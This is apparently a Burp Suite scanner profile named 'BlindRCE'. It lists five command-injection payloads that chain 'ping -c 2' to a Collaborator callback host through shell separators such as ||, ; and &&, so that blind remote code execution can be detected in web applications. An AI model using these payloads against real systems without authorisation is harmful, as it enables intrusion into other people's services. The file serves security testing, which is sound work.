[
  {
    "ProfileName": "BlindRCE",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@harshinsecurity",
    "Payloads": [
      "true, || ping -c 2 {BC}",
      "true, | ping -c 2 {BC}",
      "true,; ping -c 2 {BC}",
      "true, \u0026\u0026 ping -c 2 {BC}",
      "true, \u0026 ping -c 2 {BC}"
    ],
    "Encoder": [],
    "UrlEncode": true,
    "CharsToUrlEncode": "|;\u0026",
    "Grep": [],
    "Tags": [
      "Collaborator",
      "RCE",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 0,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "BlindRCE",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "RCE with el payloads: \u003cbr\u003e  \u003cpayload\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      70,
      80,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      21,
      31,
      41,
      51,
      61,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      36,
      81,
      82
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]